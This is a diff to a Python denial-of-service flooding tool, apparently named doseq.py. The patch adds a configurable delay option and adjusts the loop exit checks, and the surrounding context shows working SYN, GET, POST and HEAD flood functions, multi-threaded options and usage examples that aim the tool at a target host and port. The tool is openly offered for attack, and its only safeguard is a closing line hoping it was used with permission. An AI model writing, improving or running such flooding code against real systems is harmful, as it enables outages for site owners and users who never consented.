@@ -8,6 +8,7 @@
 import sys, socket, os, time, random, threading, requests, signal, optparse, re
 from urllib.parse import urlparse
 import http.client as http
+
 ## COLORS ###############
 wi="\033[1;37m" #>>White#
 rd="\033[1;31m" #>Red   #
@@ -3362,6 +3363,7 @@ def syn_flood():
                 lock.release()
                 print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+"]", end='\r')
                 if isKilled(): break
+                time.sleep(delay)
             s.close()
         except (socket.error, BrokenPipeError, Exception) as err:
                    print("["+yl+"!"+wi+"] "+yl+"SYN-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
@@ -3389,12 +3391,12 @@ def get_attack():
                         else:
                                 s.shutdown(1)
                         if isKilled():break
-                        time.sleep(.1)
+                        time.sleep(delay)
              except (socket.error, BrokenPipeError, Exception, BaseException) as err:
                     print("["+yl+"!"+wi+"] "+yl+"GET-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+                    if isKilled():break
                     if hasattr(err, 'errno'):
                         if err.errno ==24:break
-                    if isKilled():break
                     continue
              if isKilled():break
 
@@ -3415,12 +3417,12 @@ def post_attack():
                lock.release()
                print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+"]", end='\r')
                if isKilled():break
-               time.sleep(.1)
+               time.sleep(delay)
         except (socket.error, BrokenPipeError, Exception, BaseException) as err:
             print("["+yl+"!"+wi+"] "+yl+"POST-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+            if isKilled():break
             if hasattr(err, 'errno'):
                 if err.errno ==24:break
-            if isKilled():break
             continue
         if isKilled():break
 
@@ -3435,11 +3437,12 @@ def request_get_attack():
             lock.release()
             print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+f"]", end='\r')
             if isKilled():break
+            time.sleep(delay)
         except (Exception,BaseException) as err:
             print("["+yl+"!"+wi+"] "+yl+"REQUEST-GET-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+            if isKilled():break
             if hasattr(err, 'errno'):
                 if err.errno == 24: break
-            if isKilled(): break
             continue
         if isKilled():break
 
@@ -3454,11 +3457,12 @@ def request_post_attack():
             lock.release()
             print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+f"]", end='\r')
             if isKilled():break
+            time.sleep(delay)
         except (Exception,BaseException) as err:
             print("["+yl+"!"+wi+"] "+yl+"REQUEST-POST-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+            if isKilled():break
             if hasattr(err, 'errno'):
                 if err.errno == 24: break
-            if isKilled(): break
             continue
         if isKilled():break
 
@@ -3473,13 +3477,15 @@ def head_attack():
             lock.release()
             print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+f"]", end='\r')
             if isKilled():break
+            time.sleep(delay)
         except (Exception,BaseException) as err:
             print("["+yl+"!"+wi+"] "+yl+"HEAD-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+            if isKilled():break
             if hasattr(err, 'errno'):
                 if err.errno == 24: break
-            if isKilled(): break
             continue
         if isKilled():break
+
 
 def cnet(server='www.google.com', port=80) -> bool:
    try:
@@ -3488,6 +3494,7 @@ def cnet(server='www.google.com', port=80) -> bool:
       return True
    except socket.error:pass
    return False
+
 
 def quit(sig,fream):
     print(rd+"\n["+yl+"!"+rd+"]"+yl+" User requested shutdown. "+rd+"..."+wi)
@@ -3500,6 +3507,7 @@ def quit(sig,fream):
     if started:
         print("["+gr+"*"+wi+"] I Hope You Used It With Permission"+yl+"!?"+wi)
     sys.exit(0)
+
 
 def update_doseq():
     if not cnet("raw.githubusercontent.com",80):
@@ -3557,6 +3565,8 @@ OPTIONS:
     |--------
     | -a/--attack   <attack_type_(GET,POST,HEAD,TCP,UDP)>     ::> Specify attack type to be used  Default(random) (Optional)
     |--------
+    | -d/--delay    <delay number in seconds>                 ::> Specify number of delay time in senconds Default(no_delay) (Optional)
+    |--------
     | -u/--update                                             ::> Check For Updates
 -------------
 Examples:
@@ -3566,7 +3576,7 @@ Examples:
      |--------
      | python3 doseq.py -s mydomain.com -p 443
      |--------
-     | python3 doseq.py -s 192.168.0.22 -p 22 -t 500 -a tcp
+     | python3 doseq.py -s 192.168.0.22 -p 22 -t 500 -a tcp -d 5
      |--------
      | python3 doseq.py --update
 
@@ -3575,14 +3585,16 @@ parse.add_option('-s', '--server', '--target', type=str, dest='target')
 parse.add_option('-p', '--port', type=str, dest='port')
 parse.add_option('-t', '--threads', type=str, dest='threads')
 parse.add_option('-a', '--attack', type=str, dest='attack')
+parse.add_option('-d', '--delay', type=str, dest='delay')
 parse.add_option('-u', '--update', action='store_true', dest='update', default=False)
 (options,args) = parse.parse_args()
 target = options.target
 port = options.port
 threads = options.threads
 attack = options.attack
+delay = options.delay
 update =  options.update
-opts = [target,port,threads,attack,update]
+opts = [target,port,threads,attack,delay,update]
 if  target:
         if not port:
             port = 80
@@ -3605,6 +3617,14 @@ if  target:
             if not attack in attacks:
                 print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Invalid Attack Type Selected"+rd+" !!!"+wi)
                 sys.exit(1)
+        if not delay:
+            delay = .1
+        else:
+            if not delay.isdigit() or int(delay) <=0:
+                print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Invalid Delay Number Selected"+rd+" !!!"+wi)
+                sys.exit(1)
+            delay = int(delay)
+
 elif update:
      update_doseq()
      sys.exit(0)
